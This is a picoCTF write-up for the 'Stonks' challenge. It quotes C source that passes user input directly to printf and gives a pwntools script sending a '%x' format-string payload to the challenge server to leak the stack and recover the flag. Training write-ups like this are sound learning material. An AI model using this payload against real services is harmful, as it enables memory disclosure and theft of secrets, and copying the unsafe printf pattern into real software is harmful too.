# Stonks

This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/105) is a string format overflow.


Looking at the source code, we can see that the flag is loaded into the stack before the vulnerable printf of our string:

```c
int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```

Knowing this, we just need to leak the stack to retrieve the flag:

```py
from pwn import *

payload = r'%x'*100

r = remote('mercury.picoctf.net', 27912)
r.recvuntil(b'2) View my portfolio')
r.sendline(b'1')
r.recvuntil(b'What is your API token?')
r.sendline(payload.encode())
r.interactive()
```

It gives us this output:

```
❯ python3 solve.py
[+] Opening connection to mercury.picoctf.net on port 27912: Done
[*] Switching to interactive mode

Buying stonks with token:
83263f0804b00080489c3f7f12d80ffffffff18324160f7f20110f7f12dc708325180183263d083263f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3266633130613130ff97007df7f4daf8f7f204406a55aa0010f7dafce9f7f210c0f7f125c0f7f12000ff97aeb8f7da068df7f125c08048ecaff97aec40f7f34f09804b000f7f12000f7f12e20ff97aef8f7f3ad50f7f138906a55aa00f7f12000804b000ff97aef88048c868324160ff97aee4ff97aef88048be9f7f123fc0ff97afacff97afa41183241606a55aa00ff97af1000f7d55fa1f7f12000f7f120000f7d55fa11ff97afa4ff97afacff97af3410f7f12000f7f3570af7f4d0000f7f1200000a3b107ad2651e1bd000180486300f7f3ad50f7f35960804b00018048630080486628048b85
Portfolio as of Wed Dec  4 15:11:01 UTC 2024


1 shares of EY
1 shares of ZT
4 shares of GUZG
24 shares of I
1 shares of AA
296 shares of G
242 shares of QE
481 shares of JELO
Goodbye!
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to mercury.picoctf.net port 27912
```

From this we can dump the stack using cyberchef:

![alt-text](https://i.imgur.com/HT1tTee.png)

We can see thhhhhat the    padding is bad, adding some 0 to the hex we can retrieve the flag:

![alt-text](https://i.imgur.com/XtdPABl.png)
